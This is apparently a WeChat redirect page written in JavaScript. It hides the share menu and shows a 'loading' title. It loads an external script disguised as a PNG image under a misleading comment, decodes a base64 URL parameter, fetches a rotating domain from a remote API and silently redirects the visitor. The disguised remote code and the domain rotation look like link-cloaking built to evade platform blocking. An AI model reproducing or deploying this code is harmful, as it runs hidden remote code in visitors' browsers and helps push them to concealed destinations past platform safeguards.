document.addEventListener('WeixinJSBridgeReady', function onBridgeReady() {
    WeixinJSBridge.call('hideOptionMenu');
});
document.title="加载中";
//禁止下拉
(function() {
    var curTimestamp = new Date().getTime();
    var hm = document.createElement('script');
	hm.src='https://jarvis-upload-image.oss-ap-southeast-1.aliyuncs.com/jarvis/consult/122/dq.png?_t='+curTimestamp;
	var s = document.getElementsByTagName('script')[0];
	s.parentNode.insertBefore(hm, s);
})();
    String.prototype.replaceAll = function(s1, s2) {
        return this.replace(new RegExp(s1, "gm"), s2)
    };
    function getQueryVariable(variable) {
        var query = window.location.search.substring(1);
        var vars = query.split("&");
        for (var i = 0; i < vars.length; i++) {
            var pair = vars[i].split("=");
            if (pair[0] == variable) {
                return pair[1]
            }
        }
        return (false)
    }
    var data = getQueryVariable("d");
    if (data) {
        var ojbk = false;
        try {
            data = data.replaceAll("%2B", "+").replaceAll("%3D", "=");
            var d = atob(data);
            var ds = d.split("|");
            var ffname = ds[0];
            var daili = ds[1];
            var longurl = ds[2];
            var httpRequest = new XMLHttpRequest();
            var curTimestamp = new Date().getTime();
            httpRequest.open('GET', 'https://go.jhx742.com/api/ds/domain?daili=' + daili + '&ffname=' + ffname, true);
            httpRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            httpRequest.send();
            httpRequest.onreadystatechange = function () {
            if (httpRequest.readyState == 4 && httpRequest.status == 200) {
                //var data = JSON.parse(httpRequest.responseText);
                //alert(httpRequest.responseText);
                var domain = httpRequest.responseText.slice(2,-2);
                //alert(domain);
                var gotoUrl = "http://" + domain + longurl;
                window.location.replace(gotoUrl);
            }
            };
        } catch(err) {
            ojbk = true;
            document.title="发生错误了";
            alert(err)
        }
    } else {
        document.title="无效的数据";
    };
